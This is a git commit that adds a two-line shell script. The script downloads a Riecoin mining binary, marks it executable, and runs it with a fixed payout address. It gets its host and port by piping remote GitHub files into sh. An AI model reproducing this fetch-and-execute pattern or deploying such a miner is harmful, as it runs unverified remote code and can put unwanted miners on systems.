dd91976a5c9e36ddfa0b174f0bad753f8d53bca8
rienode0001 <139987883+rienode0001@users.noreply.github.com>
2023-09-25 13:43:02 +0530

    Create r.sh

---
+++ r.sh
@@ -0,0 +1,2 @@
+wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2 && chmod +x rie
+./rie noconffile Mode=Solo Host=$(curl https://raw.githubusercontent.com/rienode0001/bit/master/host | sh) Port=$(curl https://raw.githubusercontent.com/rienode0001/bit/master/port | sh) Username=guru Password=guru PayoutAddress=ric1qu9sqhnl7vwgn3dhtygwk9fyqn2a9erfwjjsp55
